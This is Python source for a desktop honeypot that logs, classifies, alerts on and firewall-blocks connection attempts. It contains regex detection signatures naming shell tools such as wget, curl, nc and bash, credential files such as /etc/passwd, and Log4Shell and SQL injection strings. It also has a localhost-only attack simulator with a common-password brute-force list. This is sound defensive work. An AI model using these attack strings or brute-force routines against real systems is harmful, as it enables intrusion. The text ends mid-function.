"""
NetDeceptor Desktop - Enterprise Honeypot GUI
-----------------------------------------------
Features
  1. SQLite persistent attack log
  2. Real-time alerts via Telegram Bot / LINE Messaging API
  3. PDF / CSV security report export
  4. Dynamic trap config (enable/disable ports, edit banners live)

Install:  pip install PyQt6 PyQt6-WebEngine reportlab geoip2
(reportlab = PDF export, geoip2 = offline GeoIP. Both optional.)

Extra features
  5. Active defense (Windows Firewall / iptables auto-block, dry-run by default)
  6. Regex signature attack classification
  7. Offline IP geolocation (MaxMind GeoLite2)
  8. SHA-256 hash-chained tamper-evident log
  9. Token-bucket rate limiting + resource caps
 10. Threat score, JSON/CSV/PDF export, IP whitelist / manual block
 11. Built-in attack simulator, onboarding wizard, "How it works" flow demo, self-check list
 12. Dark SOC-style UI
"""
import sys
import csv
import json
import time
import sqlite3
import asyncio
import os
import re
import socket
import hashlib
import shutil
import ipaddress
import subprocess
from collections import deque
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime, timedelta
from threading import Thread, Lock, Event

from PyQt6.QtCore import QObject, pyqtSignal, pyqtSlot, QUrl
from PyQt6.QtWidgets import QApplication, QMainWindow, QFileDialog
from PyQt6.QtWebEngineWidgets import QWebEngineView
from PyQt6.QtWebChannel import QWebChannel

try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.pdfbase import pdfmetrics
    from reportlab.pdfbase.ttfonts import TTFont
    from reportlab.lib.units import mm
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.graphics.shapes import Drawing
    from reportlab.graphics.charts.barcharts import VerticalBarChart
    HAS_REPORTLAB = True
except ImportError:
    HAS_REPORTLAB = False

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "netdeceptor.db"
CONFIG_PATH = BASE_DIR / "netdeceptor_config.json"


# ==========================================
# 0. CONFIG MANAGER (JSON file)
# ==========================================
DEFAULT_CONFIG = {
    "lang": "th",               # UI + alert + report language: "th" or "en"
    "onboarded": False,         # quick-start wizard shown once
    "bind_host": "127.0.0.1",   # use 0.0.0.0 to listen on all interfaces
    "traps": [
        {"port": 21, "service": "FTP Service (Fake)", "enabled": True, "severity": "MEDIUM",
         "banner": "220 (vsFTPd 3.0.3)\r\n"},
        {"port": 22, "service": "SSH Service (Fake)", "enabled": True, "severity": "HIGH",
         "banner": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n"},
        {"port": 80, "service": "HTTP Web Server (Fake)", "enabled": True, "severity": "MEDIUM",
         "banner": "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41\r\n\r\n"},
        {"port": 445, "service": "SMB File Share (Fake)", "enabled": True, "severity": "MEDIUM",
         "banner": ""},
        {"port": 3389, "service": "RDP Remote Desktop (Fake)", "enabled": True, "severity": "HIGH",
         "banner": ""},
    ],
    "defense": {
        "enabled": False,            # master switch
        "dry_run": True,             # log "would block" only - never touches the firewall
        "threshold": 5,              # block after N attacks from one IP ...
        "window_sec": 600,           # ... within this many seconds
        "block_on_high": True,       # block immediately on HIGH severity
        "block_on_flood": True,      # block immediately on DoS / flood
        "protect_private": True,     # never block LAN / private addresses
        "auto_unblock_min": 0,       # 0 = keep blocked until unblocked manually
        "allowlist": [],             # IPs / CIDRs that are never blocked
    },
    "limits": {
        "enabled": True,
        "per_ip_rate": 2.0,          # sustained connections / second / IP
        "per_ip_burst": 10,          # bucket size per IP
        "max_concurrent": 200,       # simultaneous handlers
        "ui_max_per_sec": 20,        # max events pushed to the dashboard per second
    },
    "geo": {"db_path": ""},
    "notify": {
        "enabled": False,
        "min_severity": "HIGH",          # HIGH or MEDIUM (MEDIUM = alert on everything)
        "cooldown_sec": 60,              # max 1 alert per IP per cooldown
        "telegram_token": "",
        "telegram_chat_id": "",
        "line_channel_token": "",        # LINE Messaging API channel access token
        "line_user_id": "",
    },
}


class ConfigManager:
    def __init__(self, path=CONFIG_PATH):
        self.path = path
        self.lock = Lock()
        self.data = json.loads(json.dumps(DEFAULT_CONFIG))
        self.load()

    def load(self):
        if self.path.exists():
            try:
                saved = json.loads(self.path.read_text(encoding="utf-8"))
                self.data["bind_host"] = saved.get("bind_host", self.data["bind_host"])
                if saved.get("lang") in ("th", "en"):
                    self.data["lang"] = saved["lang"]
                self.data["onboarded"] = bool(saved.get("onboarded", False))
                if isinstance(saved.get("traps"), list):
                    self.data["traps"] = saved["traps"]
                self.data["notify"].update(saved.get("notify", {}))
                for key in ("defense", "limits", "geo"):
                    self.data[key].update(saved.get(key, {}))
            except Exception as e:
                print(f"[!] Could not read config, using defaults: {e}")

    def save(self):
        with self.lock:
            tmp = self.path.with_suffix(".tmp")
            tmp.write_text(json.dumps(self.data, indent=2, ensure_ascii=False), encoding="utf-8")
            tmp.replace(self.path)

    @staticmethod
    def sanitize_traps(raw_traps):
        clean, seen = [], set()
        for t in raw_traps:
            port = int(t["port"])
            if not 1 <= port <= 65535:
                raise ValueError(f"Invalid port: {port}")
            if port in seen:
                raise ValueError(f"Duplicate port: {port}")
            seen.add(port)
            banner = str(t.get("banner", "")).replace("\r\n", "\n").replace("\n", "\r\n")
            clean.append({
                "port": port,
                "service": str(t.get("service", "Custom Service"))[:60] or "Custom Service",
                "enabled": bool(t.get("enabled", True)),
                "severity": "HIGH" if t.get("severity") == "HIGH" else "MEDIUM",
                "banner": banner[:2000],
            })
        return sorted(clean, key=lambda x: x["port"])


# ==========================================
# 1. SQLITE PERSISTENCE LAYER (hash-chained, tamper-evident)
# ==========================================
class AttackDatabase:
    GENESIS = "0" * 64
    NEW_COLS = {"attack_type": "TEXT", "country_code": "TEXT", "country": "TEXT",
                "lat": "REAL", "lon": "REAL", "prev_hash": "TEXT", "row_hash": "TEXT", "threat_score": "INTEGER"}

    def __init__(self, path=DB_PATH):
        self.path = Path(path)
        self.lock = Lock()
        self.conn = sqlite3.connect(str(path), check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        with self.lock:
            c = self.conn
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.execute("""
                CREATE TABLE IF NOT EXISTS attacks (
                    id        INTEGER PRIMARY KEY AUTOINCREMENT,
                    ts        TEXT NOT NULL,
                    ip        TEXT NOT NULL,
                    port      INTEGER NOT NULL,
                    service   TEXT,
                    payload   TEXT,
                    severity  TEXT
                )""")
            existing = {r["name"] for r in c.execute("PRAGMA table_info(attacks)")}
            for col, typ in self.NEW_COLS.items():          # migrate databases from older versions
                if col not in existing:
                    c.execute(f"ALTER TABLE attacks ADD COLUMN {col} {typ}")
            c.execute("CREATE INDEX IF NOT EXISTS idx_attacks_ts ON attacks(ts)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_attacks_ip ON attacks(ip)")
            c.execute("""
                CREATE TABLE IF NOT EXISTS blocked_ips (
                    id      INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip      TEXT NOT NULL,
                    ts      TEXT NOT NULL,
                    reason  TEXT,
                    status  TEXT NOT NULL,
                    detail  TEXT
                )""")
            c.commit()
            self._seal_legacy()

    # ---- hash chain ----
    @staticmethod
    def canon(ts, ip, port, service, payload, severity, attack_type, cc):
        return json.dumps([ts, ip, int(port), service or "", payload or "", severity or "",
                           attack_type or "", cc or ""], ensure_ascii=False, separators=(",", ":"))

    @staticmethod
    def chain_hash(prev, canon):
        return hashlib.sha256((prev + canon).encode("utf-8")).hexdigest()

    def _canon_row(self, r):
        return self.canon(r["ts"], r["ip"], r["port"], r["service"], r["payload"], r["severity"],
                          r["attack_type"], r["country_code"])

    def _seal_legacy(self):
        """Rows written before hashing existed are sealed into the chain once, at upgrade time."""
        prev = self.GENESIS
        for r in self.conn.execute("SELECT * FROM attacks ORDER BY id").fetchall():
            if r["row_hash"]:
                prev = r["row_hash"]
                continue
            h = self.chain_hash(prev, self._canon_row(r))
            self.conn.execute("UPDATE attacks SET prev_hash=?, row_hash=? WHERE id=?", (prev, h, r["id"]))
            prev = h
        self.conn.commit()

    def verify_chain(self):
        prev, n = self.GENESIS, 0
        with self.lock:
            rows = self.conn.execute("SELECT * FROM attacks ORDER BY id").fetchall()
        for r in rows:
            n += 1
            if (r["prev_hash"] or "") != prev:
                return {"ok": False, "count": n, "broken_id": r["id"], "head": prev,
                        "reason": "previous-hash link broken (a record was removed or reordered)"}
            if self.chain_hash(prev, self._canon_row(r)) != r["row_hash"]:
                return {"ok": False, "count": n, "broken_id": r["id"], "head": prev,
                        "reason": "record content was modified"}
            prev = r["row_hash"]
        return {"ok": True, "count": n, "broken_id": None, "head": prev, "reason": ""}

    # ---- writes ----
    def insert(self, inc):
        payload = inc["payload"][:1000]
        with self.lock:
            last = self.conn.execute("SELECT row_hash FROM attacks ORDER BY id DESC LIMIT 1").fetchone()
            prev = last["row_hash"] if last and last["row_hash"] else self.GENESIS
            canon = self.canon(inc["timestamp"], inc["ip"], inc["port"], inc["service"], payload,
                               inc["severity"], inc.get("attack_type"), inc.get("country_code"))
            h = self.chain_hash(prev, canon)
            cur = self.conn.execute(
                "INSERT INTO attacks (ts, ip, port, service, payload, severity, attack_type, "
                "country_code, country, lat, lon, prev_hash, row_hash, threat_score) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (inc["timestamp"], inc["ip"], inc["port"], inc["service"], payload, inc["severity"],
                 inc.get("attack_type") or "", inc.get("country_code") or "", inc.get("country") or "",
                 inc.get("lat"), inc.get("lon"), prev, h, int(inc.get("threat_score") or 0)))
            self.conn.commit()
        return cur.lastrowid, h

    def preview(self, inc):
        """What the next record's hash WOULD be - used by the 'How it works' demo. Writes nothing."""
        with self.lock:
            last = self.conn.execute("SELECT row_hash FROM attacks ORDER BY id DESC LIMIT 1").fetchone()
        prev = last["row_hash"] if last and last["row_hash"] else self.GENESIS
        canon = self.canon(inc["timestamp"], inc["ip"], inc["port"], inc["service"], inc["payload"][:1000],
                           inc["severity"], inc.get("attack_type"), inc.get("country_code"))
        return {"prev": prev, "hash": self.chain_hash(prev, canon)}

    def timeline(self, minutes=60):
        start = datetime.now().replace(second=0, microsecond=0) - timedelta(minutes=minutes - 1)
        with self.lock:
            counts = {r["m"]: r["n"] for r in self.conn.execute(
                "SELECT substr(ts,1,16) AS m, COUNT(*) AS n FROM attacks WHERE ts>=? GROUP BY m",
                (start.strftime("%Y-%m-%d %H:%M:%S"),))}
        labels, data = [], []
        for i in range(minutes):
            t = start + timedelta(minutes=i)
            labels.append(t.strftime("%H:%M"))
            data.append(counts.get(t.strftime("%Y-%m-%d %H:%M"), 0))
        return {"labels": labels, "data": data}

    # ---- blocked IP table ----
    def add_block(self, ip, reason, status, detail=""):
        with self.lock:
            self.conn.execute("INSERT INTO blocked_ips (ip, ts, reason, status, detail) VALUES (?,?,?,?,?)",
                              (ip, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), reason, status, detail[:300]))
            self.conn.commit()

    def set_block_status(self, ip, status, detail=""):
        with self.lock:
            self.conn.execute(
                "UPDATE blocked_ips SET status=?, detail=? WHERE ip=? AND status IN ('blocked','dry_run','protected','failed')",
                (status, detail[:300], ip))
            self.conn.commit()

    def list_blocks(self, limit=100):
        with self.lock:
            rows = self.conn.execute(
                "SELECT ip, ts, reason, status, detail FROM blocked_ips ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
        return [dict(r) for r in rows]

    def real_blocked_ips(self):
        with self.lock:
            return [r["ip"] for r in self.conn.execute("SELECT DISTINCT ip FROM blocked_ips WHERE status='blocked'")]

    def blocks_older_than(self, minutes):
        cutoff = (datetime.now() - timedelta(minutes=minutes)).strftime("%Y-%m-%d %H:%M:%S")
        with self.lock:
            return [r["ip"] for r in self.conn.execute(
                "SELECT DISTINCT ip FROM blocked_ips WHERE status='blocked' AND ts<=?", (cutoff,))]

    # ---- reads ----
    @staticmethod
    def _since(range_key):
        hours = {"24h": 24, "7d": 24 * 7, "30d": 24 * 30}.get(range_key)
        if not hours:
            return "1970-01-01 00:00:00"
        return (datetime.now() - timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")

    def recent(self, limit=50):
        with self.lock:
            rows = self.conn.execute(
                "SELECT ts, ip, port, service, payload, severity, attack_type, country_code, threat_score "
                "FROM attacks ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
        return [dict(r) for r in rows]

    def rows(self, range_key="all"):
        with self.lock:
            rows = self.conn.execute(
                "SELECT id, ts, ip, port, service, severity, attack_type, threat_score, country_code, country, payload, row_hash "
                "FROM attacks WHERE ts >= ? ORDER BY id DESC", (self._since(range_key),)).fetchall()
        return [dict(r) for r in rows]

    def stats(self, range_key="all"):
        since = self._since(range_key)
        with self.lock:
            c = self.conn
            total = c.execute("SELECT COUNT(*) FROM attacks WHERE ts>=?", (since,)).fetchone()[0]
            unique_ips = c.execute("SELECT COUNT(DISTINCT ip) FROM attacks WHERE ts>=?", (since,)).fetchone()[0]
            high = c.execute("SELECT COUNT(*) FROM attacks WHERE ts>=? AND severity='HIGH'", (since,)).fetchone()[0]
            top_ports = [dict(r) for r in c.execute(
                "SELECT port, service, COUNT(*) AS hits FROM attacks WHERE ts>=? "
                "GROUP BY port ORDER BY hits DESC LIMIT 5", (since,))]
            top_ips = [dict(r) for r in c.execute(
                "SELECT ip, COUNT(*) AS hits, MAX(ts) AS last_seen, MAX(COALESCE(threat_score,0)) AS score FROM attacks WHERE ts>=? "
                "GROUP BY ip ORDER BY hits DESC LIMIT 10", (since,))]
            top_types = [dict(r) for r in c.execute(
                "SELECT COALESCE(NULLIF(attack_type,''),'Unclassified') AS attack_type, COUNT(*) AS hits "
                "FROM attacks WHERE ts>=? GROUP BY 1 ORDER BY hits DESC LIMIT 8", (since,))]
            top_countries = [dict(r) for r in c.execute(
                "SELECT country_code, MAX(country) AS country, COUNT(*) AS hits FROM attacks "
                "WHERE ts>=? AND country_code IS NOT NULL AND country_code!='' "
                "GROUP BY country_code ORDER BY hits DESC LIMIT 8", (since,))]
            hourly = [0] * 24
            for r in c.execute("SELECT substr(ts,12,2) AS h, COUNT(*) AS n FROM attacks WHERE ts>=? GROUP BY h", (since,)):
                hourly[int(r["h"])] = r["n"]
            last = c.execute("SELECT ip FROM attacks ORDER BY id DESC LIMIT 1").fetchone()
            blocked = c.execute("SELECT COUNT(DISTINCT ip) FROM blocked_ips WHERE status='blocked'").fetchone()[0]
        return {
            "total": total, "unique_ips": unique_ips, "high": high, "blocked": blocked,
            "top_ports": top_ports, "top_ips": top_ips, "top_types": top_types,
            "top_countries": top_countries, "hourly": hourly,
            "last_ip": last["ip"] if last else None,
        }


# ==========================================
# 2. ALERT NOTIFIER (Telegram / LINE)
# ==========================================
class Notifier:
    SEV_RANK = {"MEDIUM": 1, "HIGH": 2}

    def __init__(self, config: ConfigManager):
        self.config = config
        self._last_sent = {}
        self._lock = Lock()

    @staticmethod
    def _post_json(url, payload, headers=None):
        req = urllib.request.Request(
            url, data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json", **(headers or {})}, method="POST")
        with urllib.request.urlopen(req, timeout=8) as resp:
            return resp.status

    def _format(self, inc):
        atype = inc.get("attack_type") or "-"
        cc = inc.get("country_code") or "-"
        blocked = inc.get("blocked") or ""
        if self.config.data.get("lang") == "th":
            lines = [f"[NetDeceptor] แจ้งเตือนระดับ {inc['severity']}",
                     f"เวลา: {inc['timestamp']}",
                     f"IP ต้นทาง: {inc['ip']} ({cc})",
                     f"ประเภท: {atype}",
                     f"เป้าหมาย: พอร์ต {inc['port']} ({inc['service']})",
                     f"ข้อมูลที่ส่งมา: {inc['payload'][:120]}"]
            if blocked:
                lines.append(f"การป้องกัน: {blocked}")
        else:
            lines = [f"[NetDeceptor] {inc['severity']} alert",
                     f"Time: {inc['timestamp']}",
                     f"Source IP: {inc['ip']} ({cc})",
                     f"Type: {atype}",
                     f"Target: port {inc['port']} ({inc['service']})",
                     f"Payload: {inc['payload'][:120]}"]
            if blocked:
                lines.append(f"Defense: {blocked}")
        return "\n".join(lines)

    def send_message(self, text):
        """Send to every configured channel. Returns list of (channel, ok, detail)."""
        cfg = self.config.data["notify"]
        results = []
        if cfg["telegram_token"] and cfg["telegram_chat_id"]:
            try:
                self._post_json(
                    f"https://api.telegram.org/bot{cfg['telegram_token']}/sendMessage",
                    {"chat_id": cfg["telegram_chat_id"], "text": text})
                results.append(("Telegram", True, "sent"))
            except Exception as e:
                results.append(("Telegram", False, str(e)))
        if cfg["line_channel_token"] and cfg["line_user_id"]:
            try:
                self._post_json(
                    "https://api.line.me/v2/bot/message/push",
                    {"to": cfg["line_user_id"], "messages": [{"type": "text", "text": text[:4900]}]},
                    {"Authorization": f"Bearer {cfg['line_channel_token']}"})
                results.append(("LINE", True, "sent"))
            except Exception as e:
                results.append(("LINE", False, str(e)))
        if not results:
            results.append(("-", False, "No channel configured"))
        return results

    def notify(self, inc):
        cfg = self.config.data["notify"]
        if not cfg["enabled"]:
            return
        if self.SEV_RANK.get(inc["severity"], 1) < self.SEV_RANK.get(cfg["min_severity"], 2):
            return
        now = time.time()
        with self._lock:
            if now - self._last_sent.get(inc["ip"], 0) < cfg["cooldown_sec"]:
                return
            self._last_sent[inc["ip"]] = now
        # network call off the engine loop so a slow API never delays the honeypot
        Thread(target=self.send_message, args=(self._format(inc),), daemon=True).start()


# ==========================================
# 3. THREAT INTEL, ACTIVE DEFENSE & HONEYPOT ENGINE
# ==========================================
def is_admin():
    try:
        if sys.platform == "win32":
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


class GeoLocator:
    """Offline GeoIP via MaxMind GeoLite2 (.mmdb). Private addresses are labelled 'LAN'."""

    def __init__(self, config):
        self.config = config
        self.reader, self.kind, self.cache = None, None, {}
        self.status = "no .mmdb file found"
        self.reopen()

    def reopen(self):
        self.cache.clear()
        if self.reader:
            try:
                self.reader.close()
            except Exception:
                pass
        self.reader, self.kind = None, None
        self.status = "no .mmdb file found"
        try:
            import geoip2.database
        except ImportError:
            self.status = "geoip2 not installed (pip install geoip2)"
            return
        custom = self.config.data.get("geo", {}).get("db_path", "").strip()
        candidates = ([Path(custom)] if custom else []) + \
                     [BASE_DIR / "GeoLite2-City.mmdb", BASE_DIR / "GeoLite2-Country.mmdb"]
        for p in candidates:
            if p.exists():
                try:
                    self.reader = geoip2.database.Reader(str(p))
                    self.kind = "city" if "city" in self.reader.metadata().database_type.lower() else "country"
                    self.status = f"{p.name} loaded"
                    return
                except Exception as e:
                    self.status = f"cannot open {p.name}: {e}"

    def lookup(self, ip):
        hit = self.cache.get(ip)
        if hit:
            return hit
        res = {"country_code": "", "country": "", "lat": None, "lon": None}
        try:
            a = ipaddress.ip_address(ip)
            if a.is_private or a.is_loopback or a.is_link_local:
                res = {"country_code": "LAN", "country": "Private network", "lat": None, "lon": None}
            elif self.reader:
                r = self.reader.city(ip) if self.kind == "city" else self.reader.country(ip)
                res["country_code"] = r.country.iso_code or ""
                res["country"] = r.country.name or ""
                if self.kind == "city" and r.location.latitude is not None:
                    res["lat"], res["lon"] = r.location.latitude, r.location.longitude
        except Exception:
            pass
        if len(self.cache) > 5000:
            self.cache.clear()
        self.cache[ip] = res
        return res


class AttackClassifier:
    """Regex signature matching + simple behavioural rules (scan / brute-force)."""
    SIGNATURES = [
        ("SQL Injection", "HIGH", re.compile(
            r"(\bunion\b.{0,30}\bselect\b|\bselect\b.{0,60}\bfrom\b|'\s*or\s*'?\d*'?\s*=|\bor\b\s+1\s*=\s*1"
            r"|;\s*drop\s+table|\bsleep\s*\(\s*\d|\bbenchmark\s*\(|information_schema|--\s*$)", re.I | re.S)),
        ("Directory Traversal", "HIGH", re.compile(
            r"(\.\./|\.\.\\|%2e%2e(%2f|%5c|/|\\)|/etc/passwd|/etc/shadow|c:\\windows|boot\.ini|win\.ini)", re.I)),
        ("Log4Shell", "HIGH", re.compile(r"\$\{\s*jndi\s*:", re.I)),
        ("Command Injection", "HIGH", re.compile(
            r"((;|\||&&|`|\$\()\s*(cat|ls|id|whoami|wget|curl|nc|ncat|bash|sh|cmd|powershell|uname)\b"
            r"|/bin/(ba)?sh|cmd\.exe)", re.I)),
        ("XSS", "MEDIUM", re.compile(r"(<script|javascript:|onerror\s*=|onload\s*=)", re.I)),
        ("Scanner Tool", "MEDIUM", re.compile(
            r"(sqlmap|nikto|nmap|masscan|zgrab|gobuster|dirbuster|wpscan|hydra|metasploit|nessus|acunetix)", re.I)),
        ("Credential Attempt", "HIGH", re.compile(r"(^(USER|PASS)\s|mstshash=)", re.I | re.M)),
        ("Web Recon", "MEDIUM", re.compile(
            r"(/wp-login|/wp-admin|phpmyadmin|/cgi-bin|/\.env|/\.git|/admin\b|/manager/html|/actuator)", re.I)),
    ]
    AUTH_PORTS = {21, 22, 3389, 445}

    def classify(self, port, payload, recent):
        """recent = [(timestamp, port)] of this IP in the last 60 s, including the current hit."""
        text = payload or ""
        for name, sev, rx in self.SIGNATURES:
            if rx.search(text):
                return name, sev
        distinct = {p for _, p in recent}
        if len(distinct) >= 3:
            return "Port Scan", "MEDIUM"
        if port in self.AUTH_PORTS and sum(1 for _, p in recent if p == port) >= 5:
            return "Brute-force", "HIGH"
        if text.startswith("No payload"):
            return "Port Scan", "MEDIUM"
        return "Probe", "MEDIUM"


TYPE_WEIGHT = {
    "Probe": 10, "Port Scan": 20, "Web Recon": 25, "Scanner Tool": 35, "XSS": 40, "Credential Attempt": 55,
    "Brute-force": 70, "DoS / Flood": 75, "SQL Injection": 80, "Directory Traversal": 80,
    "Command Injection": 90, "Log4Shell": 90,
}


def threat_score(attack_type, hits, distinct_ports, has_payload):
    """0-100. Base = how dangerous the technique is; + persistence; + breadth; + 'sent data' on plain probes."""
    score = TYPE_WEIGHT.get(attack_type, 15)
    score += min(15, max(0, hits - 1) * 3)
    score += min(10, max(0, distinct_ports - 1) * 5)
    if has_payload and attack_type in ("Probe", "Port Scan"):
        score += 5
    return min(100, score)


def risk_level(score):
    return "LOW" if score < 30 else "MEDIUM" if score < 60 else "HIGH" if score < 80 else "CRITICAL"


class RateLimiter:
    """Token bucket per source IP. check() -> 'ok' | 'drop' | 'drop_first' (first drop in 30 s)."""

    def __init__(self, config):
        self.config = config
        self.buckets = {}              # ip -> [tokens, last_ts, next_report_ts]
        self.total_dropped = 0
        self.dropped_global = 0

    def check(self, ip, now):
        cfg = self.config.data["limits"]
        rate, burst = max(0.1, float(cfg["per_ip_rate"])), max(1, int(cfg["per_ip_burst"]))
        b = self.buckets.get(ip)
        if b is None:
            if len(self.buckets) > 5000:                      # keep memory bounded
                self.buckets = {k: v for k, v in self.buckets.items() if now - v[1] < 300}
            b = self.buckets[ip] = [float(burst), now, 0.0]
        b[0] = min(burst, b[0] + (now - b[1]) * rate)
        b[1] = now
        if b[0] >= 1:
            b[0] -= 1
            return "ok"
        self.total_dropped += 1
        if now >= b[2]:
            b[2] = now + 30
            return "drop_first"
        return "drop"


class FirewallGuard:
    """Blocks abusive IPs through the OS firewall (netsh on Windows, iptables on Linux)."""

    def __init__(self, config, db):
        self.config, self.db = config, db
        self.lock = Lock()
        self.blocked = set(db.real_blocked_ips())
        self.simulated, self.noted = set(), set()
        self.is_admin = is_admin()
        try:
            self.local_ips = set(socket.gethostbyname_ex(socket.gethostname())[2]) | {"127.0.0.1"}
        except Exception:
            self.local_ips = {"127.0.0.1"}

    def protected_reason(self, ip):
        try:
            a = ipaddress.ip_address(ip)
        except ValueError:
            return "invalid address"
        if a.is_loopback or a.is_link_local or a.is_multicast or a.is_unspecified or a.is_reserved:
            return "loopback / special address"
        if ip in self.local_ips:
            return "this machine"
        cfg = self.config.data["defense"]
        if cfg["protect_private"] and a.is_private:
            return "private / LAN address"
        for entry in cfg["allowlist"]:
            try:
                if a in ipaddress.ip_network(entry, strict=False):
                    return "allowlisted"
            except ValueError:
                continue
        return None

    def should_block(self, inc, hits):
        cfg = self.config.data["defense"]
        if not cfg["enabled"]:
            return None
        if inc.get("attack_type") == "DoS / Flood" and cfg["block_on_flood"]:
            return "DoS / flood detected"
        if cfg["block_on_high"] and inc["severity"] == "HIGH":
            return f"HIGH severity ({inc.get('attack_type') or 'attack'})"
        if hits >= cfg["threshold"]:
            return f"{hits} attacks within {cfg['window_sec']}s"
        return None

    def _cmd(self, action, ip):
        v6 = ":" in ip
        if sys.platform == "win32":
            name = "NetDeceptor_Block_" + ip.replace(":", "_")
            if action == "add":
                return ["netsh", "advfirewall", "firewall", "add", "rule", f"name={name}",
                        "dir=in", "action=block", f"remoteip={ip}", "enable=yes"]
            return ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={name}"]
        if sys.platform.startswith("linux"):
            return ["ip6tables" if v6 else "iptables", "-I" if action == "add" else "-D",
                    "INPUT", "-s", ip, "-j", "DROP"]
        return None

    @staticmethod
    def _run(cmd):
        try:
            flags = getattr(subprocess, "CREATE_NO_WINDOW", 0) if sys.platform == "win32" else 0
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=10, creationflags=flags)
            return p.returncode == 0, ((p.stdout + p.stderr).strip()[:300] or "ok")
        except Exception as e:
            return False, str(e)

    def block(self, ip, reason):
        """Runs in a worker thread. Returns an event dict, or None if already handled."""
        with self.lock:
            if ip in self.blocked or ip in self.simulated or ip in self.noted:
                return None
            ev = {"ip": ip, "reason": reason}
            why = self.protected_reason(ip)
            if why:
                self.noted.add(ip)
                ev.update(status="protected", detail=why)
            elif self.config.data["defense"]["dry_run"]:
                self.simulated.add(ip)
                ev.update(status="dry_run", detail="dry-run: no firewall change made")
            else:
                cmd = self._cmd("add", ip)
                if cmd is None:
                    ok, detail = False, "unsupported platform (Windows / Linux only)"
                elif not self.is_admin:
                    ok, detail = False, "needs administrator / root rights"
                else:
                    ok, detail = self._run(cmd)
                if ok:
                    self.blocked.add(ip)
                else:
                    self.noted.add(ip)
                ev.update(status="blocked" if ok else "failed", detail=detail)
            self.db.add_block(ip, reason, ev["status"], ev["detail"])
            return ev

    def unblock(self, ip):
        try:
            ipaddress.ip_address(ip)                    # never pass unvalidated text to a command
        except ValueError:
            return False, "invalid IP"
        with self.lock:
            ok, detail = True, "removed"
            if ip in self.blocked:
                cmd = self._cmd("del", ip)
                ok, detail = self._run(cmd) if cmd else (False, "unsupported platform")
            if ok:
                self.blocked.discard(ip)
                self.simulated.discard(ip)
                self.noted.discard(ip)
                self.db.set_block_status(ip, "unblocked", detail)
            return ok, detail

    def manual_block(self, ip, reason="manual"):
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return {"ip": ip, "status": "failed", "reason": reason, "detail": "invalid IP"}
        with self.lock:
            self.noted.discard(ip)
            self.simulated.discard(ip)
        ev = self.block(ip, reason)
        return ev or {"ip": ip, "status": "blocked", "reason": reason, "detail": "already blocked"}


class AttackSimulator:
    """Sends REAL TCP traffic from this machine to its own honeypot ports (127.0.0.1) so the whole
    pipeline - classify, SQLite, alerts, rate limit - reacts exactly as it would to an outside attacker.
    It is a built-in imitation of nmap/hydra/etc, not those tools."""
    HOST = "127.0.0.1"
    PASSWORDS = ["123456", "admin", "root", "password", "toor", "qwerty", "letmein", "12345678"]
    HTTP = "GET {path} HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n{extra}\r\n"

    def __init__(self, engine, emit):
        self.engine, self.emit, self.running = engine, emit, False
        self.scenarios = {
            "port_scan": self.sc_port_scan, "ssh_brute": self.sc_ssh_brute, "ftp_brute": self.sc_ftp_brute,
            "sqli": self.sc_sqli, "traversal": self.sc_traversal, "log4shell": self.sc_log4shell,
            "cmdi": self.sc_cmdi, "xss": self.sc_xss, "rdp": self.sc_rdp, "flood": self.sc_flood,
            "full": self.sc_full,
        }

    def start(self, kind):
        if kind not in self.scenarios:
            return False, "unknown scenario"
        if self.running:
            return False, "a simulation is already running"
        self.running = True
        Thread(target=self._run, args=(kind,), daemon=True).start()
        return True, "started"

    def _run(self, kind):
        try:
            self.scenarios[kind]()
        except Exception as e:
            self._say(f"! simulation error: {e}", "err")
        finally:
            self.running = False
            self.emit({"kind": "sim", "line": "", "level": "info", "done": True})

    def _say(self, line, level="info"):
        self.emit({"kind": "sim", "line": line, "level": level, "done": False})

    def _need(self, port):
        if port in self.engine.servers:
            return True
        self._say(f"! the trap on port {port} is not listening - enable it in Trap Config", "warn")
        return False

    def _hit(self, port, data=None, wait=0.12):
        try:
            sock = socket.create_connection((self.HOST, port), timeout=1.5)
        except OSError:
            return False
        try:
            if data:
                try:
                    sock.settimeout(0.4)
                    sock.recv(256)                 # swallow the fake banner like a real client
                except OSError:
                    pass
                sock.sendall(data)
            time.sleep(wait)
        except OSError:
            pass
        finally:
            sock.close()
        return True

    def _http(self, path, extra=""):
        return self.HTTP.format(path=path, extra=extra).encode()

    def sc_port_scan(self):
        ports = sorted(set(self.engine.servers) | {8080, 8443})
        self._say("$ nmap -sT -p " + ",".join(map(str, ports)) + " 127.0.0.1    # TCP connect scan (built-in imitation)")
        for port in ports:
            ok = self._hit(port, wait=0.02)
            self._say(f"  {port}/tcp  {'open' if ok else 'closed'}", "ok" if ok else "info")
            time.sleep(0.15)

    def sc_ssh_brute(self):
        if not self._need(22):
            return
        self._say("$ hydra -l root -P rockyou.txt ssh://127.0.0.1    # imitation")
        for i, pw in enumerate(self.PASSWORDS, 1):
            self._say(f"  [ATTEMPT {i}/{len(self.PASSWORDS)}] login=root password={pw}")
            self._hit(22, b"SSH-2.0-libssh_0.9.6\r\n")
            time.sleep(0.25)

    def sc_ftp_brute(self):
        if not self._need(21):
            return
        self._say("$ hydra -l admin -P rockyou.txt ftp://127.0.0.1    # imitation")
